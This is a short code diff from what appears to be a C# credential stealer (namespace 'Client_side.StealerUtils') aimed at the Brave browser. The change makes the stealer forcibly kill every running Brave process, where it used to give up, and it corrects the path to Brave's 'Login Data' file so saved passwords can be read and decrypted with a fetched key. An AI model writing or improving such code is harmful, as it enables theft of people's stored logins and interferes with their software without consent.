@@ -28,11 +28,16 @@ namespace Client_side.StealerUtils
             Process[] processlist = Process.GetProcessesByName("brave");
             if (processlist.Length != 0)
             {
-                return new List<string> { Encryptor.ConvertStr("Brave is running! Decrypt failed!") };
+                //return new List<string> { Encryptor.ConvertStr("Brave is running! Decrypt failed!") };
+                // Kill the process
+                foreach (Process process in processlist)
+                {
+                    process.Kill();
+                }
             }
 
             string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string LoginDataPath = localappdata + @"\BraveSoftware\Brave-Browser\User Data\\Default\\Login Data";
+            string LoginDataPath = localappdata + @"\BraveSoftware\Brave-Browser\User Data\Default\Login Data";
 
             byte[] key = GetKey();
 
